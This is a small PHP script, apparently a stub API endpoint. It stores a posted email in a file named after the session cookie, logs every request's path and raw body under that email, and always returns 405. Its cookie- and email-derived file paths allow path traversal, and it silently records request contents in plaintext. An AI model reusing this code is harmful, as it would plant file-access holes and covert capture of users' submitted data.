<?php


	error_reporting(E_ALL);

	function getSession(){
		return file_get_contents("temp/".$_COOKIE['JSESSIONID']);
	}

	function setSession($ID,$value){

		$fp = fopen('temp/'.$ID, 'w');
		fwrite($fp, $value);
		fclose($fp);
	}


	function DLOG($F,$text){
		$fp = fopen('Logs/'.$F.'.txt', 'a');
		fwrite($fp, $text."\n");
		fclose($fp);
	}

	$user = getSession();
	$p = $_SERVER[REQUEST_URI];
	$body = file_get_contents('php://input');

	if($p=='/api/session' && $_SERVER[REQUEST_METHOD]=='POST'){
		setSession($_COOKIE['JSESSIONID'],$_POST['email']);

		$user = getSession();		
	}

	if($user){
		DLOG($user,'['.date("d/m/Y H:i:s").'] '.$p.' -> '.$body);
	}
	http_response_code(405);

?> 